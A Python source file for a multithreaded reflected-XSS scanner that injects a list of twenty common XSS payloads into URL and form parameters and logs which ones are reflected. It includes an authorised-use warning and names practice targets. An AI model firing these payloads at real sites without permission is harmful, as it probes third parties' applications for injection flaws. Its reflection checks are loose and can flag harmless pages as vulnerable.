import requests
import threading
import time
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import List, Dict, Optional
import sys
import re

# Rate limiting
REQUEST_DELAY = 0.5  # seconds between requests
MAX_THREADS = 5

# Thread-safe logging
print_lock = threading.Lock()
results_lock = threading.Lock()
scan_results = []

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<svg/onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
]


def log_result(url: str, param: str, payload: str, status: str, response_info: str = ""):
    """Thread-safe logging of scan results."""
    with results_lock:
        result = {
            "timestamp": datetime.now().isoformat(),
            "url": url,
            "parameter": param,
            "payload": payload,
            "status": status,
            "response_info": response_info,
        }
        scan_results.append(result)
        with print_lock:
            print(f"[{status}] {url} | Param: {param} | Payload: {payload[:40]}...")


def check_xss_reflection(response_text: str, payload: str) -> bool:
    """Check if the payload is reflected in the response."""
    # Escape special regex characters in payload
    escaped_payload = re.escape(payload)
    
    # Check for exact reflection
    if payload in response_text:
        return True
    
    # Check for HTML-encoded reflection (common sanitization attempt)
    html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    if html_encoded in response_text:
        return True
    
    # Check for script tag reflection (even if encoded, it's still dangerous)
    if "<script" in payload.lower() and ("script" in response_text.lower() or "&lt;script" in response_text.lower()):
        return True
    
    # Check for event handler reflection (onerror, onload, etc.)
    event_handlers = ["onerror", "onload", "onfocus", "onmouseover", "ontoggle", "onstart"]
    for handler in event_handlers:
        if handler in payload.lower() and handler in response_text.lower():
            return True
    
    return False


def test_xss(url: str, param: str, payload: str, method: str = "GET") -> Optional[Dict]:
    """Test a single XSS payload."""
    time.sleep(REQUEST_DELAY)  # Rate limiting
    
    try:
        if method.upper() == "GET":
            params = {param: payload}
            response = requests.get(url, params=params, timeout=5, allow_redirects=False)
        else:  # POST
            data = {param: payload}
            response = requests.post(url, data=data, timeout=5, allow_redirects=False)
        
        response_text = response.text
        status_code = response.status_code
        
        # Check if payload is reflected in response
        if check_xss_reflection(response_text, payload):
            log_result(
                url,
                param,
                payload,
                "VULNERABLE",
                f"XSS payload reflected in response (Status: {status_code})",
            )
            return {
                "vulnerable": True,
                "status_code": status_code,
                "reflected": True,
            }
        
        # Check for suspicious responses
        if status_code == 200 and len(response_text) > 0:
            # Check if response contains script tags (might indicate XSS)
            if "<script" in response_text.lower():
                log_result(url, param, payload, "SUSPICIOUS", "Response contains script tags")
                return {"vulnerable": False, "suspicious": True, "status_code": status_code}
        
        log_result(url, param, payload, "SAFE", f"Status: {status_code}")
        return {"vulnerable": False, "status_code": status_code}
        
    except requests.exceptions.RequestException as e:
        log_result(url, param, payload, "ERROR", str(e))
        return None


def scan_parameter(url: str, param: str, method: str = "GET"):
    """Scan a single parameter with all XSS payloads."""
    for payload in XSS_PAYLOADS:
        test_xss(url, param, payload, method)


def extract_parameters_from_url(url: str) -> List[str]:
    """Extract GET parameters from URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys())


def crawl_page_for_forms(url: str) -> List[Dict]:
    """Simple form crawler - extract form inputs from page."""
    try:
        response = requests.get(url, timeout=5)
        forms = []
        
        # Simple regex to find form inputs (basic implementation)
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\']'
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\']'
        
        inputs = re.findall(input_pattern, response.text, re.IGNORECASE)
        textareas = re.findall(textarea_pattern, response.text, re.IGNORECASE)
        
        all_inputs = list(set(inputs + textareas))
        
        # Find form action
        form_action_pattern = r'<form[^>]*action=["\']([^"\']+)["\']'
        form_action = re.findall(form_action_pattern, response.text, re.IGNORECASE)
        action_url = form_action[0] if form_action else url
        
        if all_inputs:
            forms.append({
                "action": urljoin(url, action_url),
                "method": "POST",  # Assume POST for forms
                "inputs": all_inputs
            })
        
        return forms
    except Exception as e:
        return []


def scan_url(url: str, method: str = "GET", custom_params: Optional[List[str]] = None):
    """Scan a URL for XSS vulnerabilities."""
    print(f"\n[*] Scanning: {url} (Method: {method})")
    
    if method.upper() == "GET":
        params = custom_params or extract_parameters_from_url(url)
        if not params:
            print(f"[!] No parameters found in URL. Attempting to crawl for forms...")
            forms = crawl_page_for_forms(url)
            if forms:
                for form in forms:
                    print(f"[*] Found form with {len(form['inputs'])} input(s): {', '.join(form['inputs'])}")
                    for param in form['inputs']:
                        scan_parameter(form['action'], param, form['method'])
                return
            else:
                print(f"[!] No parameters found. Please specify parameters manually.")
                return
    else:  # POST
        params = custom_params or []
        if not params:
            print(f"[!] No POST parameters specified.")
            return
    
    print(f"[*] Found {len(params)} parameter(s): {', '.join(params)}")
    print(f"[*] Testing {len(XSS_PAYLOADS)} XSS payloads per parameter...")
    
    threads = []
    for param in params:
        t = threading.Thread(target=scan_parameter, args=(url, param, method))
        threads.append(t)
        t.start()
        
        # Limit concurrent threads
        while threading.active_count() > MAX_THREADS:
            time.sleep(0.1)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    print(f"\n[*] Scan completed for {url}")


def save_results(filename: str = "xss_scan_results.txt"):
    """Save scan results to a file."""
    with open(filename, "w") as f:
        f.write("Web Vulnerability Scanner - XSS Scan Results\n")
        f.write("=" * 60 + "\n")
        f.write(f"Scan completed at: {datetime.now()}\n")
        f.write(f"Total tests: {len(scan_results)}\n\n")
        
        vulnerable_count = sum(1 for r in scan_results if r["status"] == "VULNERABLE")
        suspicious_count = sum(1 for r in scan_results if r["status"] == "SUSPICIOUS")
        
        f.write(f"Vulnerable endpoints: {vulnerable_count}\n")
        f.write(f"Suspicious endpoints: {suspicious_count}\n")
        f.write(f"Safe endpoints: {len(scan_results) - vulnerable_count - suspicious_count}\n\n")
        f.write("=" * 60 + "\n\n")
        
        # Group by vulnerability status
        vulnerable_results = [r for r in scan_results if r["status"] == "VULNERABLE"]
        if vulnerable_results:
            f.write("VULNERABLE ENDPOINTS:\n")
            f.write("-" * 60 + "\n\n")
            for result in vulnerable_results:
                f.write(f"Timestamp: {result['timestamp']}\n")
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['parameter']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status: {result['status']}\n")
                if result['response_info']:
                    f.write(f"Details: {result['response_info']}\n")
                f.write("\n")
        
        # Suspicious results
        suspicious_results = [r for r in scan_results if r["status"] == "SUSPICIOUS"]
        if suspicious_results:
            f.write("\nSUSPICIOUS ENDPOINTS:\n")
            f.write("-" * 60 + "\n\n")
            for result in suspicious_results[:10]:  # Limit to first 10
                f.write(f"URL: {result['url']} | Param: {result['parameter']}\n")
                f.write(f"Info: {result['response_info']}\n\n")
    
    print(f"\n[*] Results saved to {filename}")


def main():
    print("=" * 60)
    print("Web Vulnerability Scanner - XSS Detection")
    print("=" * 60)
    print("\n⚠️  WARNING: Only use this tool on systems you own or have")
    print("   explicit permission to test. Unauthorized testing is illegal.")
    print("   Recommended targets: DVWA, testphp.vulnweb.com, local apps")
    print("=" * 60)
    
    print("\nSelect scan type:")
    print("  1) Scan URL with GET parameters")
    print("  2) Scan URL with POST parameters")
    print("  3) Scan URL and extract parameters automatically (with form crawling)")
    
    choice = input("\nChoice (1-3): ").strip()
    
    url = input("Enter URL: ").strip()
    
    if choice == "1":
        params_input = input("Enter GET parameters (comma-separated, e.g., name,email): ").strip()
        params = [p.strip() for p in params_input.split(",")] if params_input else None
        scan_url(url, method="GET", custom_params=params)
    
    elif choice == "2":
        params_input = input("Enter POST parameters (comma-separated, e.g., username,comment): ").strip()
        params = [p.strip() for p in params_input.split(",")] if params_input else None
        scan_url(url, method="POST", custom_params=params)
    
    elif choice == "3":
        scan_url(url, method="GET")
    
    else:
        print("Invalid choice.")
        return
    
    save_results()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Scan interrupted by user.")
        if scan_results:
            save_results()
        sys.exit(0)
